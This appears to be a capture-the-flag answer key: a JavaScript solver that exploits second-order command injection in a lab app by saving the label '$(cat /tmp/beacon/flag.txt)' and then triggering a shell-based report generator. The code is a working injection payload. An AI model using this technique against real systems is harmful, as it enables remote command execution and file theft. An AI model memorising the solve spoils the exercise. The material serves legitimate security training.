// Reference solve — Beacon, Inquisitor. The probe validates the host strictly and runs no shell, so the host is a dead
// end. The free-text label is trusted, though: /diagnostics stores it, and GET /diagnostics/report interpolates the
// most recent saved label into `sh -c 'echo "<label>" >> /tmp/beacon/report.txt'`. Step one saves command substitution;
// step two triggers the generator, which reads the flag file into the report. Only the flag is printed.
const base = process.argv[2];
const LABEL = '$(cat /tmp/beacon/flag.txt)';

await fetch(`${base}/diagnostics`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ host: '192.168.1.1', label: LABEL }),
});

const res = await fetch(`${base}/diagnostics/report`);
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
